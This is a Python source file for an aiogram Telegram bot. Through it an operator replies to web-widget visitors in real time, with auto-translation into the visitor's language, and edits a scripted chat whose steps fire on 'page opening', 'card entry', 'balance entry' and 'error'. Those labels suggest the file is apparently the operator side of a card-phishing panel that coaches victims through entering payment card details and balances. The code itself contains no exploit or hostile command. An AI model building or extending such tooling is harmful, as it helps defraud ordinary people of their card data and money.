"""
Web chat handler — operator side.

Triggered when a visitor sends a message via the support-widget on the page.
The API pushes a Telegram notification with an inline "Ответить" button.
Callback data: wchat_reply:<session_id>:<visitor_lang>

Operator flow:
  click [↩️ Ответить] → AdminWebChat.replying state
  → type reply → translated to visitor_lang → pushed to Redis SSE queue
  → visitor receives it live in the widget

Chat script editing flow:
  "Скрипт чата" → inline list of steps (trigger names as buttons)
  → click step → see text + button label + [Редактировать текст] [Редактировать кнопку]
  → click edit → type new value → saved immediately, step detail refreshed
"""
import os

from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, Message

from api.cache import get_chat_steps, push_operator_reply, set_chat_steps
from bot.keyboards import (
    admin_cancel_reply_kb,
    chat_step_cancel_kb,
    chat_step_detail_kb,
    chat_steps_kb,
    main_menu_kb,
)

router = Router()

ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

_TRIGGER_LABELS = {
    "open":    "открытие страницы",
    "card":    "ввод карты",
    "balance": "ввод баланса",
    "error":   "ошибка",
}


class AdminWebChat(StatesGroup):
    replying         = State()
    editing_step_text = State()
    editing_step_btn  = State()


# ── translation ────────────────────────────────────────────────────────────────

async def _translate(text: str, dest: str) -> str:
    try:
        from deep_translator import GoogleTranslator
        result = GoogleTranslator(source="auto", target=dest).translate(text)
        return result or text
    except Exception:
        return text


# ── operator: click "Ответить" (from web chat notification) ───────────────────

@router.callback_query(F.data.startswith("wchat_reply:"))
async def wchat_click_reply(call: CallbackQuery, state: FSMContext):
    parts = call.data.split(":")
    session_id  = parts[1]
    visitor_lang = parts[2] if len(parts) > 2 else "en"

    await state.set_state(AdminWebChat.replying)
    await state.update_data(wchat_session=session_id, wchat_lang=visitor_lang)

    await call.message.answer(
        f"Пишите ответ посетителю страницы.\n"
        f"Язык посетителя: <code>{visitor_lang}</code>. Ответ будет переведён автоматически.\n"
        "Нажмите «Отмена» чтобы прервать.",
        reply_markup=admin_cancel_reply_kb(),
        parse_mode="HTML",
    )
    await call.answer("Введите ответ посетителю")


@router.message(AdminWebChat.replying, F.text == "Отмена")
async def wchat_cancel_reply(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Ответ отменён.", reply_markup=main_menu_kb())


@router.message(AdminWebChat.replying)
async def wchat_send_reply(message: Message, state: FSMContext):
    data = await state.get_data()
    session_id   = data.get("wchat_session")
    visitor_lang = data.get("wchat_lang", "en")

    if not session_id:
        await state.clear()
        await message.answer("Ошибка: нет активной сессии.", reply_markup=main_menu_kb())
        return

    reply_text = message.text or ""
    translated = reply_text
    if visitor_lang and visitor_lang != "ru":
        translated = await _translate(reply_text, dest=visitor_lang)

    await push_operator_reply(session_id, translated)
    await state.clear()
    await message.answer("✅ Ответ отправлен посетителю.", reply_markup=main_menu_kb())


# ── helpers ────────────────────────────────────────────────────────────────────

def _step_detail_text(s: dict) -> str:
    trigger = _TRIGGER_LABELS.get(s.get("trigger", ""), s.get("trigger", ""))
    return (
        f"<b>Шаг {s['step']} — {trigger}</b>\n\n"
        f"Текст: {s['text']}\n"
        f"Кнопка: {s.get('button', '—')}"
    )


# ── "Скрипт чата" — show step list ────────────────────────────────────────────

@router.message(F.text == "Скрипт чата")
async def cmd_chat_scripts(message: Message, state: FSMContext):
    await state.clear()
    steps = await get_chat_steps()
    await message.answer(
        "<b>Скрипт чата</b>\nВыберите шаг для просмотра и редактирования:",
        reply_markup=chat_steps_kb(steps),
        parse_mode="HTML",
    )


# ── view a single step ─────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("cstep:view:"))
async def cstep_view(call: CallbackQuery, state: FSMContext):
    await state.clear()
    step_num = int(call.data.split(":")[2])
    steps = await get_chat_steps()
    s = next((x for x in steps if x["step"] == step_num), None)
    if not s:
        await call.answer("Шаг не найден.", show_alert=True)
        return
    await call.message.edit_text(
        _step_detail_text(s),
        reply_markup=chat_step_detail_kb(step_num),
        parse_mode="HTML",
    )
    await call.answer()


# ── back to step list ──────────────────────────────────────────────────────────

@router.callback_query(F.data == "cstep:back")
async def cstep_back(call: CallbackQuery, state: FSMContext):
    await state.clear()
    steps = await get_chat_steps()
    await call.message.edit_text(
        "<b>Скрипт чата</b>\nВыберите шаг для просмотра и редактирования:",
        reply_markup=chat_steps_kb(steps),
        parse_mode="HTML",
    )
    await call.answer()


# ── start editing text ─────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("cstep:edit_text:"))
async def cstep_edit_text_start(call: CallbackQuery, state: FSMContext):
    step_num = int(call.data.split(":")[2])
    await state.set_state(AdminWebChat.editing_step_text)
    await state.update_data(editing_step=step_num, editing_msg_id=call.message.message_id)
    await call.message.edit_text(
        f"Введите новый <b>текст</b> для шага {step_num}:",
        reply_markup=chat_step_cancel_kb(step_num),
        parse_mode="HTML",
    )
    await call.answer()


# ── start editing button label ─────────────────────────────────────────────────

@router.callback_query(F.data.startswith("cstep:edit_btn:"))
async def cstep_edit_btn_start(call: CallbackQuery, state: FSMContext):
    step_num = int(call.data.split(":")[2])
    await state.set_state(AdminWebChat.editing_step_btn)
    await state.update_data(editing_step=step_num, editing_msg_id=call.message.message_id)
    await call.message.edit_text(
        f"Введите новое название <b>кнопки</b> для шага {step_num}:",
        reply_markup=chat_step_cancel_kb(step_num),
        parse_mode="HTML",
    )
    await call.answer()


# ── receive new text ───────────────────────────────────────────────────────────

@router.message(AdminWebChat.editing_step_text)
async def cstep_receive_text(message: Message, state: FSMContext):
    data = await state.get_data()
    step_num = data.get("editing_step")
    msg_id   = data.get("editing_msg_id")

    steps = await get_chat_steps()
    updated = False
    for s in steps:
        if s["step"] == step_num:
            s["text"] = message.text.strip()
            updated = True
            break

    await state.clear()
    if not updated:
        await message.answer("Шаг не найден.")
        return

    await set_chat_steps(steps=steps)
    s = next(x for x in steps if x["step"] == step_num)

    await message.delete()
    try:
        await message.bot.edit_message_text(
            _step_detail_text(s),
            chat_id=message.chat.id,
            message_id=msg_id,
            reply_markup=chat_step_detail_kb(step_num),
            parse_mode="HTML",
        )
    except Exception:
        await message.answer(
            _step_detail_text(s),
            reply_markup=chat_step_detail_kb(step_num),
            parse_mode="HTML",
        )


# ── receive new button label ───────────────────────────────────────────────────

@router.message(AdminWebChat.editing_step_btn)
async def cstep_receive_btn(message: Message, state: FSMContext):
    data = await state.get_data()
    step_num = data.get("editing_step")
    msg_id   = data.get("editing_msg_id")

    steps = await get_chat_steps()
    updated = False
    for s in steps:
        if s["step"] == step_num:
            s["button"] = message.text.strip()
            updated = True
            break

    await state.clear()
    if not updated:
        await message.answer("Шаг не найден.")
        return

    await set_chat_steps(steps=steps)
    s = next(x for x in steps if x["step"] == step_num)

    await message.delete()
    try:
        await message.bot.edit_message_text(
            _step_detail_text(s),
            chat_id=message.chat.id,
            message_id=msg_id,
            reply_markup=chat_step_detail_kb(step_num),
            parse_mode="HTML",
        )
    except Exception:
        await message.answer(
            _step_detail_text(s),
            reply_markup=chat_step_detail_kb(step_num),
            parse_mode="HTML",
        )
